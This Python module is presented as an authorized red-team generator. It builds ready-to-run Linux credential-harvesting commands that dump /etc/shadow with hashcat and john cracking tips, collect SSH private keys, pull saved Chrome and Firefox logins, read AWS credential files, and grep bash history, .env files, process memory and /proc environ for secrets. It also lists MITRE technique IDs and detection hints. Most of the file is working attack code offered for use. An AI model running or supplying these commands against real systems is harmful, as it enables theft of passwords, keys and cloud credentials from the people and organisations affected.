"""
Linux credential harvest and loot collection generator.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "shadow_file",
    "bash_history",
    "env_secrets",
    "ssh_keys",
    "browser_creds",
    "aws_creds",
    "memory_strings",
    "process_env",
)


@dataclass
class LinuxHarvestResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


def _shadow_file(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"cat /etc/shadow /etc/passwd | tee {outfile} && "
        f"cat /etc/shadow | awk -F: '$2 !~ /^[!*]/' | wc -l"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="shadow_file",
        notes=(
            f"Dumps /etc/shadow and /etc/passwd. Requires root or shadow group. "
            f"Crack with: hashcat -m 1800 {outfile} rockyou.txt (SHA-512), "
            f"or john --wordlist=rockyou.txt {outfile}"
        ),
        techniques=["T1003.008"],
        risk="CRITICAL",
        detections=[
            "auditd: open/read on /etc/shadow by non-root (Event: SYSCALL + OPENAT)",
            "cat /etc/shadow in bash history (if logging enabled)",
            "File access patterns from unusual process hierarchy",
        ],
    )


def _bash_history(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"find /root /home -name '.bash_history' -readable 2>/dev/null "
        f"| xargs grep -hE '(password|passwd|token|key|secret|api)' 2>/dev/null "
        f"| tee {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="bash_history",
        notes=f"Searches .bash_history files for credential keywords. Output to {outfile}.",
        techniques=["T1552.003"],
        risk="MEDIUM",
        detections=[
            "auditd: openat on /root/.bash_history or /home/*/.bash_history",
            "find command traversing /home/* by non-admin process",
        ],
    )


def _env_secrets(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"printenv | grep -iE '(key|token|secret|pass|pwd|api|auth)' | tee {outfile}; "
        f"find / -maxdepth 5 -name '.env' -readable 2>/dev/null "
        f"| xargs grep -hE '(KEY|TOKEN|SECRET|PASS)' 2>/dev/null | tee -a {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="env_secrets",
        notes=f"Dumps environment variables and .env files matching credential patterns. Output to {outfile}.",
        techniques=["T1552.007", "T1083"],
        risk="HIGH",
        detections=[
            "find traversal with -name '.env' from unexpected process",
            "Access to application .env files outside normal app process",
        ],
    )


def _ssh_keys(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null "
        f"| xargs -I{{}} sh -c 'echo \"=== {{}} ===\"; cat {{}}' 2>/dev/null | tee {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="ssh_keys",
        notes=f"Collects all SSH private keys across user home directories. Output to {outfile}.",
        techniques=["T1552.004"],
        risk="CRITICAL",
        detections=[
            "auditd: openat on ~/.ssh/id_rsa by non-owner or non-ssh-agent process",
            "find traversal of /home/ for SSH key files",
            "File read of private key files from unexpected process",
        ],
    )


def _browser_creds(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"# Chrome/Chromium:\n"
        f"find ~/.config/google-chrome ~/.config/chromium -name 'Login Data' 2>/dev/null "
        f"| xargs -I{{}} sqlite3 {{}} "
        f"'SELECT origin_url,username_value,password_value FROM logins' 2>/dev/null | tee {outfile};\n"
        f"# Firefox:\n"
        f"find ~/.mozilla -name 'logins.json' 2>/dev/null "
        f"| xargs -I{{}} python3 -c \""
        f"import json,sys; d=json.load(open('{{}}'));"
        f"[print(l['hostname'],l['encryptedUsername'],l['encryptedPassword']) for l in d.get('logins',[])]"
        f"\" 2>/dev/null | tee -a {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="browser_creds",
        notes=(
            f"Extracts stored browser credentials. Chrome passwords are AES-256 encrypted with OS keyring key. "
            f"Firefox credentials require NSS decryption (use firefox_decrypt.py). Output to {outfile}."
        ),
        techniques=["T1555.003"],
        risk="HIGH",
        detections=[
            "sqlite3 accessing Chrome 'Login Data' from non-browser process",
            "Read access to ~/.mozilla/firefox/*/logins.json",
            "GNOME keyring access from unexpected process",
        ],
    )


def _aws_creds(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"cat ~/.aws/credentials 2>/dev/null | tee {outfile}; "
        f"cat ~/.aws/config 2>/dev/null | tee -a {outfile}; "
        f"find / -maxdepth 6 -name 'credentials' -path '*/.aws/*' -readable 2>/dev/null "
        f"| xargs cat 2>/dev/null | tee -a {outfile}; "
        f"env | grep -E '^AWS_' | tee -a {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="aws_creds",
        notes=(
            f"Harvests AWS CLI credentials, config, and environment variables. "
            f"Also checks service account files for EC2/ECS contexts. Output to {outfile}."
        ),
        techniques=["T1552.001", "T1528"],
        risk="CRITICAL",
        detections=[
            "Read access to ~/.aws/credentials from non-AWS-CLI process",
            "AWS API calls from EC2 instance using stolen credential (CloudTrail: unusual source IP)",
            "find traversal for credential files",
        ],
    )


def _memory_strings(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"# Requires root or ptrace capability\n"
        f"for pid in $(pgrep -f 'nginx\\|apache\\|postgres\\|mysql\\|sshd'); do\n"
        f"  strings /proc/$pid/mem 2>/dev/null | "
        f"grep -iE '(password|secret|token|key)' | head -20\n"
        f"done | tee {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="memory_strings",
        notes=(
            f"Scans process memory for credential strings. Requires root or CAP_SYS_PTRACE. "
            f"Targets web servers and databases. Output to {outfile}."
        ),
        techniques=["T1003"],
        risk="CRITICAL",
        detections=[
            "auditd: PTRACE_ATTACH syscall from non-debugger process",
            "Access to /proc/<pid>/mem by non-owner",
            "eBPF/falco: memory read of sensitive process",
        ],
    )


def _process_env(outfile: str, lhost: str, lport: int) -> LinuxHarvestResult:
    cmd = (
        f"for pid in $(ls /proc | grep -E '^[0-9]+$'); do\n"
        f"  env_file=\"/proc/$pid/environ\"\n"
        f"  if [ -r \"$env_file\" ]; then\n"
        f"    content=$(cat $env_file | tr '\\0' '\\n' | grep -iE '(key|token|pass|secret|api)')\n"
        f"    if [ -n \"$content\" ]; then\n"
        f"      echo \"=== PID $pid ($(cat /proc/$pid/comm 2>/dev/null)) ===\"\n"
        f"      echo \"$content\"\n"
        f"    fi\n"
        f"  fi\n"
        f"done 2>/dev/null | tee {outfile}"
    )
    return LinuxHarvestResult(
        command=cmd,
        technique="process_env",
        notes=(
            f"Reads /proc/PID/environ for all accessible processes and greps for credential keywords. "
            f"Works without root for processes owned by current user. Output to {outfile}."
        ),
        techniques=["T1057", "T1552.007"],
        risk="HIGH",
        detections=[
            "auditd: openat on /proc/*/environ from unexpected process",
            "Enumeration of all /proc entries (unusually high /proc read rate)",
        ],
    )


_DISPATCH = {
    "shadow_file": _shadow_file,
    "bash_history": _bash_history,
    "env_secrets": _env_secrets,
    "ssh_keys": _ssh_keys,
    "browser_creds": _browser_creds,
    "aws_creds": _aws_creds,
    "memory_strings": _memory_strings,
    "process_env": _process_env,
}


def generate_linux_harvest(
    technique: str,
    outfile: str = "/tmp/loot.txt",
    lhost: str = "192.168.1.100",
    lport: int = 8080,
) -> LinuxHarvestResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](outfile, lhost, lport)
